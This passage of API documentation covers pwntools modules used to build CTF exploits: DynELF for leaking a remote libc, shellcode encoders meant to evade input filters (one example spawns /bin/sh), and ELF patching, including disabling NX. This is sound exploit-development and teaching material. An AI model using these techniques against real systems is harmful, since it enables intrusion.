<code class="descname">libc</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/dynelf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.dynelf.DynELF.libc" title="Permalink to this definition">¶</a></dt>
<dd><p>Leak the Build ID of the remote libc.so, download the file,
and load an <code class="docutils literal"><span class="pre">ELF</span></code> object with the correct base address.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Returns:</th><td class="field-body">An ELF object, or None.</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.dynelf.DynELF.link_map">
<code class="descname">link_map</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/dynelf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.dynelf.DynELF.link_map" title="Permalink to this definition">¶</a></dt>
<dd><p>Pointer to the runtime link_map object</p>
</dd></dl>

</dd></dl>

<dl class="function">
<dt id="pwnlib.dynelf.gnu_hash">
<code class="descclassname">pwnlib.dynelf.</code><code class="descname">gnu_hash</code><span class="sig-paren">(</span><em>str</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/dynelf.py#L84-92"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.dynelf.gnu_hash" title="Permalink to this definition">¶</a></dt>
<dd><p>Function used to generated GNU-style hashes for strings.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.dynelf.sysv_hash">
<code class="descclassname">pwnlib.dynelf.</code><code class="descname">sysv_hash</code><span class="sig-paren">(</span><em>str</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/dynelf.py#L70-82"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.dynelf.sysv_hash" title="Permalink to this definition">¶</a></dt>
<dd><p>Function used to generate SYSV-style hashes for strings.</p>
</dd></dl>

</div>
<span id="document-encoders"></span><div class="section" id="module-pwnlib.encoders">
<span id="pwnlib-encoders-encoding-shellcode"></span><h3><a class="reference internal" href="#module-pwnlib.encoders" title="pwnlib.encoders"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.encoders</span></code></a> &#8212; Encoding Shellcode<a class="headerlink" href="#module-pwnlib.encoders" title="Permalink to this headline">¶</a></h3>
<p>Encode shellcode to avoid input filtering and impress your friends!</p>
<span class="target" id="module-pwnlib.encoders.encoder"></span><dl class="function">
<dt id="pwnlib.encoders.encoder.alphanumeric">
<code class="descclassname">pwnlib.encoders.encoder.</code><code class="descname">alphanumeric</code><span class="sig-paren">(</span><em>raw_bytes</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/encoders/encoder.py#L1360-1367"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.encoders.encoder.alphanumeric" title="Permalink to this definition">¶</a></dt>
<dd><p>Encode the shellcode <code class="docutils literal"><span class="pre">raw_bytes</span></code> such that it does not
contain any bytes except for [A-Za-z0-9].</p>
<p>Accepts the same arguments as <a class="reference internal" href="#pwnlib.encoders.encoder.encode" title="pwnlib.encoders.encoder.encode"><code class="xref py py-func docutils literal"><span class="pre">encode()</span></code></a>.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.encoders.encoder.encode">
<code class="descclassname">pwnlib.encoders.encoder.</code><code class="descname">encode</code><span class="sig-paren">(</span><em>raw_bytes</em>, <em>avoid</em>, <em>expr</em>, <em>force</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/encoders/encoder.py#L1360-1367"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.encoders.encoder.encode" title="Permalink to this definition">¶</a></dt>
<dd><p>Encode shellcode <code class="docutils literal"><span class="pre">raw_bytes</span></code> such that it does not contain
any bytes in <code class="docutils literal"><span class="pre">avoid</span></code> or <code class="docutils literal"><span class="pre">expr</span></code>.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>raw_bytes</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Sequence of shellcode bytes to encode.</li>
<li><strong>avoid</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Bytes to avoid</li>
<li><strong>expr</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Regular expression which matches bad characters.</li>
<li><strong>force</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Force re-encoding of the shellcode, even if it
doesn&#8217;t contain any bytes in <code class="docutils literal"><span class="pre">avoid</span></code>.</li>
</ul>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.encoders.encoder.line">
<code class="descclassname">pwnlib.encoders.encoder.</code><code class="descname">line</code><span class="sig-paren">(</span><em>raw_bytes</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/encoders/encoder.py#L1360-1367"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.encoders.encoder.line" title="Permalink to this definition">¶</a></dt>
<dd><p>Encode the shellcode <code class="docutils literal"><span class="pre">raw_bytes</span></code> such that it does not
contain any NULL bytes or whitespace.</p>
<p>Accepts the same arguments as <a class="reference internal" href="#pwnlib.encoders.encoder.encode" title="pwnlib.encoders.encoder.encode"><code class="xref py py-func docutils literal"><span class="pre">encode()</span></code></a>.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.encoders.encoder.null">
<code class="descclassname">pwnlib.encoders.encoder.</code><code class="descname">null</code><span class="sig-paren">(</span><em>raw_bytes</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/encoders/encoder.py#L1360-1367"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.encoders.encoder.null" title="Permalink to this definition">¶</a></dt>
<dd><p>Encode the shellcode <code class="docutils literal"><span class="pre">raw_bytes</span></code> such that it does not
contain any NULL bytes.</p>
<p>Accepts the same arguments as <a class="reference internal" href="#pwnlib.encoders.encoder.encode" title="pwnlib.encoders.encoder.encode"><code class="xref py py-func docutils literal"><span class="pre">encode()</span></code></a>.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.encoders.encoder.printable">
<code class="descclassname">pwnlib.encoders.encoder.</code><code class="descname">printable</code><span class="sig-paren">(</span><em>raw_bytes</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/encoders/encoder.py#L1360-1367"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.encoders.encoder.printable" title="Permalink to this definition">¶</a></dt>
<dd><p>Encode the shellcode <code class="docutils literal"><span class="pre">raw_bytes</span></code> such that it only contains
non-space printable bytes.</p>
<p>Accepts the same arguments as <a class="reference internal" href="#pwnlib.encoders.encoder.encode" title="pwnlib.encoders.encoder.encode"><code class="xref py py-func docutils literal"><span class="pre">encode()</span></code></a>.</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.encoders.encoder.scramble">
<code class="descclassname">pwnlib.encoders.encoder.</code><code class="descname">scramble</code><span class="sig-paren">(</span><em>raw_bytes</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/encoders/encoder.py#L1360-1367"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.encoders.encoder.scramble" title="Permalink to this definition">¶</a></dt>
<dd><p>Encodes the input data with a random encoder.</p>
<p>Accepts the same arguments as <a class="reference internal" href="#pwnlib.encoders.encoder.encode" title="pwnlib.encoders.encoder.encode"><code class="xref py py-func docutils literal"><span class="pre">encode()</span></code></a>.</p>
</dd></dl>

<span class="target" id="module-pwnlib.encoders.amd64"></span><span class="target" id="module-pwnlib.encoders.arm"></span><span class="target" id="module-pwnlib.encoders.i386"></span><span class="target" id="module-pwnlib.encoders.i386.xor"></span><dl class="class">
<dt id="pwnlib.encoders.i386.xor.i386XorEncoder">
<em class="property">class </em><code class="descclassname">pwnlib.encoders.i386.xor.</code><code class="descname">i386XorEncoder</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/encoders/i386/xor.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.encoders.i386.xor.i386XorEncoder" title="Permalink to this definition">¶</a></dt>
<dd><p>Generates an XOR decoder for i386.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">context</span><span class="o">.</span><span class="n">clear</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">avoid</span> <span class="o">=</span> <span class="s1">&#39;/bin/sh</span><span class="se">\xcc\xcd\x80</span><span class="s1">&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">encoded</span> <span class="o">=</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">encoders</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">xor</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="n">avoid</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">assert</span> <span class="ow">not</span> <span class="nb">any</span><span class="p">(</span><span class="n">c</span> <span class="ow">in</span> <span class="n">encoded</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">avoid</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span> <span class="o">=</span> <span class="n">run_shellcode</span><span class="p">(</span><span class="n">encoded</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;echo hello; exit&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="go">&#39;hello\n&#39;</span>
</pre></div>
</div>
<p>Shellcode encoder class</p>
<p>Implements an architecture-specific shellcode encoder</p>
</dd></dl>

</div>
<span id="document-elf"></span><div class="section" id="module-pwnlib.elf">
<span id="pwnlib-elf-elf-executables-and-libraries"></span><h3><a class="reference internal" href="#module-pwnlib.elf" title="pwnlib.elf"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.elf</span></code></a> &#8212; ELF Executables and Libraries<a class="headerlink" href="#module-pwnlib.elf" title="Permalink to this headline">¶</a></h3>
<p>Most exploitable CTF challenges are provided in the Executable and Linkable
Format (<code class="docutils literal"><span class="pre">ELF</span></code>).  Generally, it is very useful to be able to interact with
these files to extract data such as function addresses, ROP gadgets, and
writable page addresses.</p>
<div class="section" id="elf-modules">
<h4>ELF Modules<a class="headerlink" href="#elf-modules" title="Permalink to this headline">¶</a></h4>
<div class="toctree-wrapper compound">
<span id="document-elf/elf"></span><div class="section" id="module-pwnlib.elf.elf">
<span id="pwnlib-elf-elf-elf-files"></span><h5><a class="reference internal" href="#module-pwnlib.elf.elf" title="pwnlib.elf.elf"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.elf.elf</span></code></a> &#8212; ELF Files<a class="headerlink" href="#module-pwnlib.elf.elf" title="Permalink to this headline">¶</a></h5>
<p>Exposes functionality for manipulating ELF files</p>
<p>Stop hard-coding things!  Look them up at runtime with <a class="reference internal" href="index.html#module-pwnlib.elf" title="pwnlib.elf"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.elf</span></code></a>.</p>
<div class="section" id="example-usage">
<h6>Example Usage<a class="headerlink" href="#example-usage" title="Permalink to this headline">¶</a></h6>
<div class="highlight-python"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/bin/cat&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">address</span><span class="p">)</span> 
<span class="go">0x400000</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">])</span> 
<span class="go">0x401680</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">])</span> 
<span class="go">0x60b070</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">])</span> 
<span class="go">0x401680</span>
</pre></div>
</div>
<p>You can even patch and save the files.</p>
<div class="highlight-python"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/bin/cat&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">e</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">address</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>
<span class="go">&#39;ELF&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">e</span><span class="o">.</span><span class="n">asm</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">address</span><span class="p">,</span> <span class="s1">&#39;ret&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">e</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="s1">&#39;/tmp/quiet-cat&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">disasm</span><span class="p">(</span><span class="nb">file</span><span class="p">(</span><span class="s1">&#39;/tmp/quiet-cat&#39;</span><span class="p">,</span><span class="s1">&#39;rb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
<span class="go">&#39;   0:   c3                      ret&#39;</span>
</pre></div>
</div>
</div>
<div class="section" id="module-members">
<h6>Module Members<a class="headerlink" href="#module-members" title="Permalink to this headline">¶</a></h6>
<dl class="class">
<dt id="pwnlib.elf.elf.ELF">
<em class="property">class </em><code class="descclassname">pwnlib.elf.elf.</code><code class="descname">ELF</code><span class="sig-paren">(</span><em>path</em>, <em>checksec=True</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF" title="Permalink to this definition">¶</a></dt>
<dd><p>Bases: <code class="xref py py-class docutils literal"><span class="pre">elftools.elf.elffile.ELFFile</span></code></p>
<p>Encapsulates information about an ELF file.</p>
<p class="rubric">Example</p>
<div class="highlight-python"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">bash</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">which</span><span class="p">(</span><span class="s1">&#39;bash&#39;</span><span class="p">))</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">hex</span><span class="p">(</span><span class="n">bash</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">])</span>
<span class="go">0x41dac0</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">hex</span><span class="p">(</span><span class="n">bash</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">])</span>
<span class="go">0x41dac0</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">u32</span><span class="p">(</span><span class="n">bash</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">bash</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">],</span> <span class="mi">4</span><span class="p">))</span>
<span class="go">0x41dac6</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">print</span> <span class="n">bash</span><span class="o">.</span><span class="n">disasm</span><span class="p">(</span><span class="n">bash</span><span class="o">.</span><span class="n">plt</span><span class="o">.</span><span class="n">read</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
<span class="go">0:   ff 25 1a 18 2d 00       jmp    QWORD PTR [rip+0x2d181a]        # 0x2d1820</span>
<span class="go">6:   68 59 00 00 00          push   0x59</span>
<span class="go">b:   e9 50 fa ff ff          jmp    0xfffffffffffffa60</span>
</pre></div>
</div>
<dl class="method">
<dt id="pwnlib.elf.elf.ELF.asm">
<code class="descname">asm</code><span class="sig-paren">(</span><em>address</em>, <em>assembly</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py#L1213-1223"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.asm" title="Permalink to this definition">¶</a></dt>
<dd><p>Assembles the specified instructions and inserts them
into the ELF at the specified address.</p>
<p>This modifies the ELF in-pace.
The resulting binary can be saved with <a class="reference internal" href="#pwnlib.elf.elf.ELF.save" title="pwnlib.elf.elf.ELF.save"><code class="xref py py-meth docutils literal"><span class="pre">ELF.save()</span></code></a></p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.elf.elf.ELF.bss">
<code class="descname">bss</code><span class="sig-paren">(</span><em>offset=0</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py#L1225-1233"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.bss" title="Permalink to this definition">¶</a></dt>
<dd><table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Returns:</th><td class="field-body">Address of the <code class="docutils literal"><span class="pre">.bss</span></code> section, plus the specified offset.</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="method">
<dt id="pwnlib.elf.elf.ELF.checksec">
<code class="descname">checksec</code><span class="sig-paren">(</span><em>banner=True</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py#L1504-1597"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.checksec" title="Permalink to this definition">¶</a></dt>
<dd><p>Prints out information in the binary, similar to <code class="docutils literal"><span class="pre">checksec.sh</span></code>.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>banner</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Whether to print the path to the ELF binary.</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="method">
<dt id="pwnlib.elf.elf.ELF.debug">
<code class="descname">debug</code><span class="sig-paren">(</span><em>argv=[]</em>, <em>*a</em>, <em>**kw</em><span class="sig-paren">)</span> &#x2192; tube<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py#L396-410"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.debug" title="Permalink to this definition">¶</a></dt>
<dd><p>Debug the ELF with <a class="reference internal" href="index.html#pwnlib.gdb.debug" title="pwnlib.gdb.debug"><code class="xref py py-func docutils literal"><span class="pre">gdb.debug()</span></code></a>.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>argv</strong> (<a class="reference internal" href="index.html#pwnlib.protocols.adb.AdbClient.list" title="pwnlib.protocols.adb.AdbClient.list"><em>list</em></a>) &#8211; List of arguments to the binary</li>
<li><strong>*args</strong> &#8211; Extra arguments to <a class="reference internal" href="index.html#pwnlib.gdb.debug" title="pwnlib.gdb.debug"><code class="xref py py-func docutils literal"><span class="pre">gdb.debug()</span></code></a></li>
<li><strong>**kwargs</strong> &#8211; Extra arguments to <a class="reference internal" href="index.html#pwnlib.gdb.debug" title="pwnlib.gdb.debug"><code class="xref py py-func docutils literal"><span class="pre">gdb.debug()</span></code></a></li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last"><a class="reference internal" href="index.html#pwnlib.tubes.tube.tube" title="pwnlib.tubes.tube.tube"><code class="xref py py-class docutils literal"><span class="pre">tube</span></code></a> &#8211; See <a class="reference internal" href="index.html#pwnlib.gdb.debug" title="pwnlib.gdb.debug"><code class="xref py py-func docutils literal"><span class="pre">gdb.debug()</span></code></a></p>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="method">
<dt id="pwnlib.elf.elf.ELF.disable_nx">
<code class="descname">disable_nx</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py#L1734-1759"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.disable_nx" title="Permalink to this definition">¶</a></dt>
<dd><p>Disables NX for the ELF.</p>
<p>Zeroes out the <code class="docutils literal"><span class="pre">PT_GNU_STACK</span></code> program header <code class="docutils literal"><span class="pre">p_type</span></code> field.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.elf.elf.ELF.disasm">
<code class="descname">disasm</code><span class="sig-paren">(</span><em>address</em>, <em>n_bytes</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py#L1201-1211"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.disasm" title="Permalink to this definition">¶</a></dt>
<dd><p>Returns a string of disassembled instructions at
the specified virtual memory address</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.elf.elf.ELF.dynamic_by_tag">
<code class="descname">dynamic_by_tag</code><span class="sig-paren">(</span><em>tag</em><span class="sig-paren">)</span> &#x2192; tag<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py#L1238-1258"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.dynamic_by_tag" title="Permalink to this definition">¶</a></dt>
<dd><table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>tag</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Named <code class="docutils literal"><span class="pre">DT_XXX</span></code> tag (e.g. <code class="docutils literal"><span class="pre">'DT_STRTAB'</span></code>).</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><code class="xref py py-class docutils literal"><span class="pre">elftools.elf.dynamic.DynamicTag</span></code></td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="method">
<dt id="pwnlib.elf.elf.ELF.dynamic_string">
<code class="descname">dynamic_string</code><span class="sig-paren">(</span><em>offset</em><span class="sig-paren">)</span> &#x2192; bytes<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py#L1272-1293"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.dynamic_string" title="Permalink to this definition">¶</a></dt>
<dd><p>Fetches an enumerated string from the <code class="docutils literal"><span class="pre">DT_STRTAB</span></code> table.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>offset</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; String index</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><code class="xref py py-class docutils literal"><span class="pre">str</span></code></a> &#8211; String from the table as raw bytes.</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="method">
<dt id="pwnlib.elf.elf.ELF.dynamic_value_by_tag">
<code class="descname">dynamic_value_by_tag</code><span class="sig-paren">(</span><em>tag</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py#L1260-1270"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.dynamic_value_by_tag" title="Permalink to this definition">¶</a></dt>
<dd><p>Retrieve the value from a dynamic tag a la <code class="docutils literal"><span class="pre">DT_XXX</span></code>.</p>
<p>If the tag is missing, returns <code class="docutils literal"><span class="pre">None</span></code>.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.elf.elf.ELF.fit">
<code class="descname">fit</code><span class="sig-paren">(</span><em>address</em>, <em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py#L1724-1729"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.fit" title="Permalink to this definition">¶</a></dt>
<dd><p>Writes fitted data into the specified address.</p>
<p>See: <a class="reference internal" href="index.html#pwnlib.util.packing.fit" title="pwnlib.util.packing.fit"><code class="xref py py-func docutils literal"><span class="pre">packing.fit()</span></code></a></p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.elf.elf.ELF.flat">
<code class="descname">flat</code><span class="sig-paren">(</span><em>address</em>, <em>*a</em>, <em>**kw</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py#L1717-1722"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.flat" title="Permalink to this definition">¶</a></dt>
<dd><p>Writes a full array of values to the specified address.</p>
<p>See: <a class="reference internal" href="index.html#pwnlib.util.packing.flat" title="pwnlib.util.packing.flat"><code class="xref py py-func docutils literal"><span class="pre">packing.flat()</span></code></a></p>
</dd></dl>

<dl class="staticmethod">
<dt id="pwnlib.elf.elf.ELF.from_assembly">
<em class="property">static </em><code class="descname">from_assembly</code><span class="sig-paren">(</span><em>assembly</em><span class="sig-paren">)</span> &#x2192; ELF<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/elf/elf.py#L1360-1367"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.elf.elf.ELF.from_assembly" title="Permalink to this definition">¶</a></dt>
<dd><p>Given an assembly listing, return a fully loaded ELF object
which contains that assembly at its entry point.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>assembly</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Assembly language listing</li>
<li><strong>vma</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Address of the entry point and the module&#8217;s base address.</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="o">.</span><span class="n">from_assembly</span><span class="p">(</span><span class="s1">&#39;nop; foo: int 0x80&#39;</span><span class="p">,</span> <span class="n">vma</span> <span class="o">=</span> <span class="mh">0x400000</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">e</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;foo&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x400001</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">e</span><span class="o">.</span><span class="n">disasm</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">entry</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
<span class="go">&#39;  400000:       90                      nop&#39;</span>
